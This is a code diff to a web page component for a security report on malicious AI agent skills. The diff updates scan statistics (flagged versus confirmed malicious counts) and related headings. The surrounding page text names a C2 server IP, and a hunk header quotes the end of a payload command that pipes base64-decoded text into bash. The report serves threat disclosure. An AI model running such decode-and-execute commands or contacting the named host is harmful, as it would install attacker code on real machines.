@@ -93,8 +93,9 @@ const ATTACKS = [
 
 /* ── Key stats ── */
 const STATS_GRID = [
-  { value: '96,096', label: 'Skills scanned' },
-  { value: '751', label: 'Confirmed malware' },
+  { value: STATS.wildScan.skillsScanned.toLocaleString(), label: 'Skills scanned' },
+  { value: STATS.wildScan.flagged.toLocaleString(), label: 'Flagged' },
+  { value: STATS.wildScan.confirmedMalware.toLocaleString(), label: 'Confirmed malware' },
   { value: STATS.totalRulesDisplay, label: 'ATR detection rules' },
   { value: '<4 min', label: 'Total scan time' },
 ];
@@ -117,10 +118,10 @@ export default function ScanReportContent() {
           </FadeInUp>
           <FadeInUp delay={0.1}>
             <p className="text-lg text-text-secondary max-w-2xl mt-6 leading-relaxed">
-              We scanned 96,096 AI agent skills across every major registry. We found 751
-              distributing active malware. Three coordinated attackers. Base64-encoded reverse
-              shells. A C2 server at 91.92.242.30. All hiding in tools called &ldquo;Solana
-              Wallet&rdquo; and &ldquo;Nano Banana Pro.&rdquo;
+              We scanned 96,096 AI agent skills across every major registry. 1,302 came back
+              flagged; 552 were confirmed malicious after manual review. Three coordinated
+              attackers. Base64-encoded reverse shells. A C2 server at 91.92.242.30. All hiding in
+              tools called &ldquo;Solana Wallet&rdquo; and &ldquo;Nano Banana Pro.&rdquo;
             </p>
           </FadeInUp>
           <FadeInUp delay={0.15}>
@@ -205,7 +206,7 @@ dGFycmQzdHh3KSI=' | base64 -D | bash`}</code>
             THREAT ACTORS
           </p>
           <h2 className="text-[clamp(20px,3vw,36px)] font-bold text-text-primary leading-[1.1] mb-10">
-            Three Coordinated Attackers. 751 Poisoned Skills.
+            Three Coordinated Attackers. 552 Confirmed Malicious Skills.
           </h2>
         </FadeInUp>
         <div className="grid gap-4">
